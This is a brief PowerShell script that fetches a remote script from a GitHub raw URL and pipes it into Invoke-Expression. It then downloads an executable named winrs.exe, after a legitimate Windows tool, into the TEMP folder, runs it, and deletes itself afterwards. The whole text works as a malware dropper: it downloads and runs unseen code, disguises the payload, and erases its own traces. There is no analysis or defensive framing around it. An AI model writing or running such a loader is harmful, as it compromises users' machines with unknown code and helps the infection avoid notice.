# Download and execute the first script
Invoke-RestMethod -Uri "https://raw.githubusercontent.com/truongcp0305/dp/main/3.ps1" | Invoke-Expression

# Download and execute the exe file
$exePath = "$env:TEMP\winrs.exe"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/truongcp0305/dp/main/winrs.exe" -OutFile $exePath
Start-Process -FilePath $exePath -Wait

# Self-delete the script after execution
if ($PSCommandPath) {
    Remove-Item -Path $PSCommandPath -Force
}
